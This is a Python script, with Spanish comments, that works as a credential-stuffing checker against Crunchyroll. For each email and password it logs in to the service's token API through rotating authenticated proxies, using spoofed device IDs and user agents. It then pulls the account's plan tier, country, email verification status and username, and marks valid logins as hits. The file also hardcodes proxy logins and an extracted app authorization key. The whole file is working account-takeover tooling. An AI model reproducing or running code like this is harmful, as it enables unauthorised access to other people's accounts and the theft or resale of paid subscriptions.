import requests
import time
import urllib.parse
import uuid
import re
import random
import ipaddress
from urllib.parse import quote

# ==========================================
# DICCIONARIO COMPLETO DE PAÍSES
# ==========================================
country_translations = {
    "AF": "Afghanistan \U0001F1E6\U0001F1EB", "AX": "Aland Islands \U0001F1E6\U0001F1FD",
    "AL": "Albania \U0001F1E6\U0001F1F1", "DZ": "Algeria \U0001F1E9\U0001F1FF",
    "AS": "American Samoa \U0001F1E6\U0001F1F8", "AD": "Andorra \U0001F1E6\U0001F1E9",
    "AO": "Angola \U0001F1E6\U0001F1F4", "AI": "Anguilla \U0001F1E6\U0001F1EE",
    "AQ": "Antarctica \U0001F1E6\U0001F1F6", "AG": "Antigua and Barbuda \U0001F1E6\U0001F1EC",
    "AR": "Argentina \U0001F1E6\U0001F1F7", "AM": "Armenia \U0001F1E6\U0001F1F2",
    "AW": "Aruba \U0001F1E6\U0001F1FC", "AU": "Australia \U0001F1E6\U0001F1FA",
    "AT": "Austria \U0001F1E6\U0001F1F9", "AZ": "Azerbaijan \U0001F1E6\U0001F1FF",
    "BS": "Bahamas \U0001F1E7\U0001F1F8", "BH": "Bahrain \U0001F1E7\U0001F1ED",
    "BD": "Bangladesh \U0001F1E7\U0001F1E9", "BB": "Barbados \U0001F1E7\U0001F1E7",
    "BY": "Belarus \U0001F1E7\U0001F1FE", "BE": "Belgium \U0001F1E7\U0001F1EA",
    "BZ": "Belize \U0001F1E7\U0001F1FF", "BJ": "Benin \U0001F1E7\U0001F1EF",
    "BM": "Bermuda \U0001F1E7\U0001F1F2", "BT": "Bhutan \U0001F1E7\U0001F1F9",
    "BO": "Bolivia, Plurinational State of \U0001F1E7\U0001F1F4", "BQ": "Bonaire \U0001F1E7\U0001F1F6",
    "BA": "Bosnia and Herzegovina \U0001F1E7\U0001F1E6", "BW": "Botswana \U0001F1E7\U0001F1FC",
    "BV": "Bouvet Island \U0001F1E7\U0001F1FB", "BR": "Brazil \U0001F1E7\U0001F1F7",
    "IO": "British Indian Ocean Territory \U0001F1EE\U0001F1F4", "BN": "Brunei Darussalam \U0001F1E7\U0001F1F3",
    "BG": "Bulgaria \U0001F1E7\U0001F1EC", "BF": "Burkina Faso \U0001F1E7\U0001F1EB",
    "BI": "Burundi \U0001F1E7\U0001F1EE", "KH": "Cambodia \U0001F1F0\U0001F1ED",
    "CM": "Cameroon \U0001F1E8\U0001F1F2", "CA": "Canada \U0001F1E8\U0001F1E6",
    "CV": "Cape Verde \U0001F1E8\U0001F1FB", "KY": "Cayman Islands \U0001F1F0\U0001F1FE",
    "CF": "Central African Republic \U0001F1E8\U0001F1EB", "TD": "Chad \U0001F1F9\U0001F1E9",
    "CL": "Chile \U0001F1E8\U0001F1F1", "CN": "China \U0001F1E8\U0001F1F3",
    "CX": "Christmas Island \U0001F1E8\U0001F1FD", "CC": "Cocos Islands \U0001F1E8\U0001F1E8",
    "CO": "Colombia \U0001F1E8\U0001F1F4", "KM": "Comoros \U0001F1F0\U0001F1F2",
    "CG": "Congo \U0001F1E8\U0001F1EC", "CD": "Congo (DRC) \U0001F1E8\U0001F1E9",
    "CK": "Cook Islands \U0001F1E8\U0001F1F0", "CR": "Costa Rica \U0001F1E8\U0001F1F7",
    "CI": "Cote d'Ivoire \U0001F1E8\U0001F1EE", "HR": "Croatia \U0001F1ED\U0001F1F7",
    "CU": "Cuba \U0001F1E8\U0001F1FA", "CW": "Curacao \U0001F1E8\U0001F1FC",
    "CY": "Cyprus \U0001F1E8\U0001F1FE", "CZ": "Czech Republic \U0001F1E8\U0001F1FF",
    "DK": "Denmark \U0001F1E9\U0001F1F0", "DJ": "Djibouti \U0001F1E9\U0001F1EF",
    "DM": "Dominica \U0001F1E9\U0001F1F2", "DO": "Dominican Republic \U0001F1E9\U0001F1F4",
    "EC": "Ecuador \U0001F1EA\U0001F1E8", "EG": "Egypt \U0001F1EA\U0001F1EC",
    "SV": "El Salvador \U0001F1F8\U0001F1FB", "GQ": "Equatorial Guinea \U0001F1EC\U0001F1F6",
    "ER": "Eritrea \U0001F1EA\U0001F1F7", "EE": "Estonia \U0001F1EA\U0001F1EA",
    "ET": "Ethiopia \U0001F1EA\U0001F1F9", "FK": "Falkland Islands \U0001F1EB\U0001F1F0",
    "FO": "Faroe Islands \U0001F1EB\U0001F1F4", "FJ": "Fiji \U0001F1EB\U0001F1EF",
    "FI": "Finland \U0001F1EB\U0001F1EE", "FR": "France \U0001F1EB\U0001F1F7",
    "GF": "French Guiana \U0001F1EC\U0001F1EB", "PF": "French Polynesia \U0001F1F5\U0001F1EB",
    "TF": "French Southern Territories \U0001F1F9\U0001F1EB", "GA": "Gabon \U0001F1EC\U0001F1E6",
    "GM": "Gambia \U0001F1EC\U0001F1F2", "GE": "Georgia \U0001F1EC\U0001F1EA",
    "DE": "Germany \U0001F1E9\U0001F1EA", "GH": "Ghana \U0001F1EC\U0001F1ED",
    "GI": "Gibraltar \U0001F1EC\U0001F1EE", "GR": "Greece \U0001F1EC\U0001F1F7",
    "GL": "Greenland \U0001F1EC\U0001F1F1", "GD": "Grenada \U0001F1EC\U0001F1E9",
    "GP": "Guadeloupe \U0001F1EC\U0001F1F5", "GU": "Guam \U0001F1EC\U0001F1FA",
    "GT": "Guatemala \U0001F1EC\U0001F1F9", "GG": "Guernsey \U0001F1EC\U0001F1EC",
    "GN": "Guinea \U0001F1EC\U0001F1F3", "GW": "Guinea-Bissau \U0001F1EC\U0001F1FC",
    "GY": "Guyana \U0001F1EC\U0001F1FE", "HT": "Haiti \U0001F1ED\U0001F1F9",
    "HM": "Heard Island and McDonald Islands \U0001F1ED\U0001F1F2", "VA": "Holy See (Vatican City State) \U0001F1FB\U0001F1E6",
    "HN": "Honduras \U0001F1ED\U0001F1F3", "HK": "Hong Kong \U0001F1ED\U0001F1F0",
    "HU": "Hungary \U0001F1ED\U0001F1FA", "IS": "Iceland \U0001F1EE\U0001F1F8",
    "IN": "India \U0001F1EE\U0001F1F3", "ID": "Indonesia \U0001F1EE\U0001F1E9",
    "IR": "Iran \U0001F1EE\U0001F1F7", "IQ": "Iraq \U0001F1EE\U0001F1F6",
    "IE": "Ireland \U0001F1EE\U0001F1EA", "IM": "Isle of Man \U0001F1EE\U0001F1F2",
    "IL": "Israel \U0001F1EE\U0001F1F1", "IT": "Italy \U0001F1EE\U0001F1F9",
    "JM": "Jamaica \U0001F1EF\U0001F1F2", "JP": "Japan \U0001F1EF\U0001F1F5",
    "JE": "Jersey \U0001F1EF\U0001F1EA", "JO": "Jordan \U0001F1EF\U0001F1F4",
    "KZ": "Kazakhstan \U0001F1F0\U0001F1FF", "KE": "Kenya \U0001F1F0\U0001F1EA",
    "KI": "Kiribati \U0001F1F0\U0001F1EE", "KP": "North Korea \U0001F1F0\U0001F1F5",
    "KR": "South Korea \U0001F1F0\U0001F1F7", "KW": "Kuwait \U0001F1F0\U0001F1FC",
    "KG": "Kyrgyzstan \U0001F1F0\U0001F1EC", "LA": "Laos \U0001F1F1\U0001F1E6",
    "LV": "Latvia \U0001F1F1\U0001F1FB", "LB": "Lebanon \U0001F1F1\U0001F1E7",
    "LS": "Lesotho \U0001F1F1\U0001F1F8", "LR": "Liberia \U0001F1F1\U0001F1F7",
    "LY": "Libya \U0001F1F1\U0001F1FE", "LI": "Liechtenstein \U0001F1F1\U0001F1EE",
    "LT": "Lithuania \U0001F1F1\U0001F1F9", "LU": "Luxembourg \U0001F1F1\U0001F1FA",
    "MO": "Macao \U0001F1F2\U0001F1F4", "MK": "North Macedonia \U0001F1F2\U0001F1F0",
    "MG": "Madagascar \U0001F1F2\U0001F1EC", "MW": "Malawi \U0001F1F2\U0001F1FC",
    "MY": "Malaysia \U0001F1F2\U0001F1FE", "MV": "Maldives \U0001F1F2\U0001F1FB",
    "ML": "Mali \U0001F1F2\U0001F1F1", "MT": "Malta \U0001F1F2\U0001F1F9",
    "MH": "Marshall Islands \U0001F1F2\U0001F1ED", "MQ": "Martinique \U0001F1F2\U0001F1F6",
    "MR": "Mauritania \U0001F1F2\U0001F1F7", "MU": "Mauritius \U0001F1F2\U0001F1FA",
    "YT": "Mayotte \U0001F1FE\U0001F1F9", "MX": "Mexico \U0001F1F2\U0001F1FD",
    "FM": "Micronesia \U0001F1EB\U0001F1F2", "MD": "Moldova \U0001F1F2\U0001F1E9",
    "MC": "Monaco \U0001F1F2\U0001F1E8", "MN": "Mongolia \U0001F1F2\U0001F1F3",
    "ME": "Montenegro \U0001F1F2\U0001F1EA", "MS": "Montserrat \U0001F1F2\U0001F1F8",
    "MA": "Morocco \U0001F1F2\U0001F1E6", "MZ": "Mozambique \U0001F1F2\U0001F1FF",
    "MM": "Myanmar \U0001F1F2\U0001F1F2", "NA": "Namibia \U0001F1F3\U0001F1E6",
    "NR": "Nauru \U0001F1F3\U0001F1F7", "NP": "Nepal \U0001F1F3\U0001F1F5",
    "NL": "Netherlands \U0001F1F3\U0001F1F1", "NC": "New Caledonia \U0001F1F3\U0001F1E8",
    "NZ": "New Zealand \U0001F1F3\U0001F1FF", "NI": "Nicaragua \U0001F1F3\U0001F1EE",
    "NE": "Niger \U0001F1F3\U0001F1EA", "NG": "Nigeria \U0001F1F3\U0001F1EC",
    "NU": "Niue \U0001F1F3\U0001F1FA", "NF": "Norfolk Island \U0001F1F3\U0001F1EB",
    "MP": "Northern Mariana Islands \U0001F1F2\U0001F1F5", "NO": "Norway \U0001F1F3\U0001F1F4",
    "OM": "Oman \U0001F1F4\U0001F1F2", "PK": "Pakistan \U0001F1F5\U0001F1F0",
    "PW": "Palau \U0001F1F5\U0001F1FC", "PS": "Palestine \U0001F1F5\U0001F1F8",
    "PA": "Panama \U0001F1F5\U0001F1E6", "PG": "Papua New Guinea \U0001F1F5\U0001F1EC",
    "PY": "Paraguay \U0001F1F5\U0001F1FE", "PE": "Peru \U0001F1F5\U0001F1EA",
    "PH": "Philippines \U0001F1F5\U0001F1ED", "PN": "Pitcairn \U0001F1F5\U0001F1F3",
    "PL": "Poland \U0001F1F5\U0001F1F1", "PT": "Portugal \U0001F1F5\U0001F1F9",
    "PR": "Puerto Rico \U0001F1F5\U0001F1F7", "QA": "Qatar \U0001F1F6\U0001F1E6",
    "RE": "Reunion \U0001F1F7\U0001F1EA", "RO": "Romania \U0001F1F7\U0001F1F4",
    "RU": "Russia \U0001F1F7\U0001F1FA", "RW": "Rwanda \U0001F1F7\U0001F1FC",
    "BL": "Saint Barthelemy \U0001F1E7\U0001F1F1", "SH": "Saint Helena \U0001F1F8\U0001F1ED",
    "KN": "Saint Kitts \U0001F1F0\U0001F1F3", "LC": "Saint Lucia \U0001F1F1\U0001F1E8",
    "MF": "Saint Martin \U0001F1EB\U0001F1F2", "PM": "Saint Pierre \U0001F1F5\U0001F1F2",
    "VC": "Saint Vincent \U0001F1FB\U0001F1E8", "WS": "Samoa \U0001F1FC\U0001F1F8",
    "SM": "San Marino \U0001F1F8\U0001F1F2", "ST": "Sao Tome \U0001F1F8\U0001F1F9",
    "SA": "Saudi Arabia \U0001F1F8\U0001F1E6", "SN": "Senegal \U0001F1F8\U0001F1F3",
    "RS": "Serbia \U0001F1F7\U0001F1F8", "SC": "Seychelles \U0001F1F8\U0001F1E8",
    "SL": "Sierra Leone \U0001F1F8\U0001F1F1", "SG": "Singapore \U0001F1F8\U0001F1EC",
    "SX": "Sint Maarten \U0001F1F8\U0001F1FD", "SK": "Slovakia \U0001F1F8\U0001F1F0",
    "SI": "Slovenia \U0001F1F8\U0001F1EE", "SB": "Solomon Islands \U0001F1F8\U0001F1E7",
    "SO": "Somalia \U0001F1F8\U0001F1F4", "ZA": "South Africa \U0001F1FF\U0001F1E6",
    "GS": "South Georgia \U0001F1EC\U0001F1F8", "SS": "South Sudan \U0001F1F8\U0001F1F8",
    "ES": "Spain \U0001F1EA\U0001F1F8", "LK": "Sri Lanka \U0001F1F1\U0001F1F0",
    "SD": "Sudan \U0001F1F8\U0001F1E9", "SR": "Suriname \U0001F1F8\U0001F1F7",
    "SJ": "Svalbard \U0001F1F8\U0001F1EF", "SZ": "Swaziland \U0001F1F8\U0001F1FF",
    "SE": "Sweden \U0001F1F8\U0001F1EA", "CH": "Switzerland \U0001F1E8\U0001F1ED",
    "SY": "Syria \U0001F1F8\U0001F1FE", "TW": "Taiwan \U0001F1F9\U0001F1FC",
    "TJ": "Tajikistan \U0001F1F9\U0001F1EF", "TZ": "Tanzania \U0001F1F9\U0001F1FF",
    "TH": "Thailand \U0001F1F9\U0001F1ED", "TL": "Timor-Leste \U0001F1F9\U0001F1F1",
    "TG": "Togo \U0001F1F9\U0001F1EC", "TK": "Tokelau \U0001F1F9\U0001F1F0",
    "TO": "Tonga \U0001F1F9\U0001F1F4", "TT": "Trinidad and Tobago \U0001F1F9\U0001F1F9",
    "TN": "Tunisia \U0001F1F9\U0001F1F3", "TR": "Turkey \U0001F1F9\U0001F1F7",
    "TM": "Turkmenistan \U0001F1F9\U0001F1F2", "TC": "Turks and Caicos \U0001F1F9\U0001F1E8",
    "TV": "Tuvalu \U0001F1F9\U0001F1FB", "UG": "Uganda \U0001F1FA\U0001F1EC",
    "UA": "Ukraine \U0001F1FA\U0001F1E6", "AE": "UAE \U0001F1E6\U0001F1EA",
    "GB": "United Kingdom \U0001F1EC\U0001F1E7", "US": "United States \U0001F1FA\U0001F1F8",
    "UM": "US Minor Outlying Islands \U0001F1FA\U0001F1F2", "UY": "Uruguay \U0001F1FA\U0001F1FE",
    "UZ": "Uzbekistan \U0001F1FA\U0001F1FF", "VU": "Vanuatu \U0001F1FB\U0001F1FA",
    "VE": "Venezuela \U0001F1FB\U0001F1EA", "VN": "Vietnam \U0001F1FB\U0001F1F3",
    "VG": "British Virgin Islands \U0001F1FB\U0001F1EC", "VI": "US Virgin Islands \U0001F1FB\U0001F1EE",
    "WF": "Wallis and Futuna \U0001F1FC\U0001F1EB", "EH": "Western Sahara \U0001F1EA\U0001F1ED",
    "YE": "Yemen \U0001F1FE\U0001F1EA", "ZM": "Zambia \U0001F1FF\U0001F1F2",
    "ZW": "Zimbabwe \U0001F1FF\U0001F1FC"
}

# ==========================================
# LÓGICA DE PROXIES
# ==========================================
def _wrap_host_for_url(host: str) -> str:
    h = (host or "").strip()
    if not h: return h
    if h.startswith('[') and h.endswith(']'): return h
    try:
        ip = ipaddress.ip_address(h)
        if isinstance(ip, ipaddress.IPv6Address): return f'[{h}]'
        return h
    except ValueError: return h

def _split_proxy_line(line: str):
    s = (line or "").strip()
    if not s: raise ValueError("empty proxy line")
    if "://" in s:
        scheme, rest = s.split("://", 1)
        user = pwd = None
        if '@' in rest:
            creds, hostport = rest.split('@', 1)
            if ':' in creds: user, pwd = creds.split(':', 1)
            else: user, pwd = creds, ''
        else: hostport = rest
        host = hostport; port = None
        if host.startswith('['):
            rb = host.find(']')
            host_lit = host[:rb+1]
            tail = host[rb+1:]
            host = host_lit.strip('[]')
            if tail.startswith(':'): port = tail[1:]
        elif host.count(':') >= 2 and host.find(']:') == -1: host, port = host.rsplit(':', 1)
        elif ':' in host: host, port = host.split(':', 1)
        if port is None: raise ValueError("missing port")
        return host, port, user, pwd

    if s.startswith('['):
        rb = s.find(']')
        host = s[1:rb]
        tail = s[rb+1:]
        tail = tail[1:]
        parts = tail.split(':')
        if len(parts) == 1: port = parts[0]; user = pwd = None
        elif len(parts) == 3: port, user, pwd = parts
        else: raise ValueError("unsupported format")
        return host, port, user, pwd

    parts = s.split(':')
    if len(parts) >= 4:
        host = ':'.join(parts[:-3])
        port, user, pwd = parts[-3:]
    elif len(parts) == 2:
        host, port = parts
        user = pwd = None
    elif len(parts) > 2:
        host = ':'.join(parts[:-1])
        port = parts[-1]
        user = pwd = None
    else: raise ValueError("invalid proxy line")
    return host, port, user, pwd

def build_proxy_urls(line: str, proxy_type: str = 'http'):
    try:
        host, port, user, pwd = _split_proxy_line(line)
        host_wrapped = _wrap_host_for_url(host)
        port = str(port).strip()
        user = (user or '').strip()
        pwd = (pwd or '').strip()
        if pwd.lower() == 'blank': pwd = ''
        auth = f"{quote(user)}:{quote(pwd)}@" if user else ''
        scheme = 'http' if (proxy_type or 'http').lower() == 'http' else 'https'
        base = f"{scheme}://{auth}{host_wrapped}:{port}"
        return {'http': base, 'https': base}
    except:
        return None

def generate_random_user_agent():
    user_agents = [
        "Crunchyroll/3.32.3 Android/9 okhttp/4.9.2",
        "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

def generate_random_device_info():
    devices = [
        ("SM-G935F", "samsung SM-G935F"), ("DUK-AL20", "DUK-AL20"),
        ("SM-S918B", "samsung SM-S918B"), ("Pixel 8 Pro", "Google Pixel 8 Pro")
    ]
    device_id = str(uuid.uuid4())
    device_name, device_type = random.choice(devices)
    return device_id, device_name, device_type

# ==========================================
# PROXIES
# ==========================================
PROXY_LIST = [
    "45.38.107.97:6014:poxweudy:pvma7be69xzy",
    "64.137.96.74:6641:poxweudy:pvma7be69xzy",
    "198.23.243.226:6361:poxweudy:pvma7be69xzy",
    "38.154.185.97:6370:poxweudy:pvma7be69xzy",
    "84.247.60.125:6095:poxweudy:pvma7be69xzy",
    "191.96.254.138:6185:poxweudy:pvma7be69xzy",
    "198.46.161.42:5092:poxweudy:pvma7be69xzy",
    "64.137.10.153:5803:poxweudy:pvma7be69xzy",
    "104.164.49.38:7693:poxweudy:pvma7be69xzy",
    "23.26.71.145:5628:poxweudy:pvma7be69xzy"
]

def check_crunchyroll_account(email, password):
    proxy_raw = random.choice(PROXY_LIST) if PROXY_LIST else None
    proxies = build_proxy_urls(proxy_raw) if proxy_raw else None
    
    device_id, device_name, device_type = generate_random_device_info()
    user_agent = generate_random_user_agent()

    payload = f"username={email}&password={password}&grant_type=password&scope=offline_access&device_id={device_id}&device_name={device_name}&device_type={device_type}"
    
    # ACÁ ESTÁ LA LLAVE DE KRUL
    headers = {
        "Host": "beta-api.crunchyroll.com",
        "authorization": "Basic c2ZjOWYtLXEyYzJ2YWE1eW1zbHo6cThiVk5SYmp2c1g5ZGJwdDV5eTl5TXhjakNRMXgteU0=",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": user_agent
    }

    try:
        session_req = requests.Session()
        r = session_req.post("https://beta-api.crunchyroll.com/auth/v1/token", headers=headers, data=payload, proxies=proxies, timeout=15)
        
        if r.status_code == 401:
            return {"valid": False, "reason": "Credenciales inválidas"}
        if r.status_code in [403, 406, 429, 500, 502, 503, 504]:
            return {"valid": False, "reason": f"Error de Proxy/IP: {r.status_code}"}
        if r.status_code != 200:
            return {"valid": False, "reason": f"Error HTTP {r.status_code}"}

        access_token_match = re.search(r'"access_token":"(.*?)"', r.text)
        access_token = access_token_match.group(1) if access_token_match else None
        if not access_token:
            return {"valid": False, "reason": "No se obtuvo token"}

        # DETALLES
        details_headers = {
            "User-Agent": user_agent, "Pragma": "no-cache", "Accept": "*/*",
            "host": "beta-api.crunchyroll.com", "authorization": f"Bearer {access_token}",
            "x-datadog-sampling-priority": "0", "etp-anonymous-id": str(uuid.uuid4()), "accept-encoding": "gzip",
        }
        r_det = session_req.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=details_headers, proxies=proxies, timeout=15)
        
        email_verified = "NO❌"
        external_id = None
        if r_det.status_code == 200:
            email_verified_match = re.search(r'"email_verified":(true|false)', r_det.text)
            email_verified = "YES✅" if email_verified_match and email_verified_match.group(1) == "true" else "NO❌"
            external_id_match = re.search(r'"external_id":"(.*?)"', r_det.text)
            external_id = external_id_match.group(1) if external_id_match else None

        if not external_id:
            return {"valid": False, "reason": "No se obtuvo external_id"}

        # PERFIL
        profile_url = "https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile"
        r_prof = session_req.get(profile_url, headers=details_headers, proxies=proxies, timeout=15)
        username = "Unknown"
        if r_prof.status_code == 200:
            username_match = re.search(r'"username":"(.*?)"', r_prof.text)
            username = username_match.group(1) if username_match else "Unknown"

        # BENEFICIOS (PLAN)
        benefits_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
        benefits_headers = {
            "host": "beta-api.crunchyroll.com", "authorization": f"Bearer {access_token}",
            "x-datadog-sampling-priority": "0", "etp-anonymous-id": str(uuid.uuid4()),
            "accept-encoding": "gzip", "user-agent": user_agent,
        }
        r_ben = session_req.get(benefits_url, headers=benefits_headers, proxies=proxies, timeout=15)
        
        if r_ben.status_code == 404 or "subscription.not_found" in r_ben.text:
            return {"valid": True, "reason": f"FREE | Mail: {email_verified}"}

        if r_ben.status_code == 200:
            benefits_data = r_ben.text
            country_match = re.search(r'"subscription_country":"(.*?)"', benefits_data)
            subscription_country = country_match.group(1) if country_match else "Unknown"
            if subscription_country != "Unknown":
                subscription_country = subscription_country.upper().strip()
            country_full_name = country_translations.get(subscription_country, f"{subscription_country}")

            plan_type = "UNKNOWN"
            max_streams = "0"
            benefit_match = re.search(r'"benefit":"concurrent_streams\.(\d+)"', benefits_data)
            if benefit_match:
                streams_value = benefit_match.group(1)
                max_streams = streams_value
                if streams_value == "6": plan_type = "ULTIMATE FAN"
                elif streams_value == "4": plan_type = "MEGA FAN"
                elif streams_value == "1": plan_type = "FAN MEMBER"

            return {"valid": True, "reason": f"{plan_type} | País: {country_full_name} | Mail: {email_verified} | User: {username}"}

        return {"valid": True, "reason": "HIT (Plan desconocido)"}

    except Exception as e:
        return {"valid": False, "reason": f"Error Red: {str(e)}"}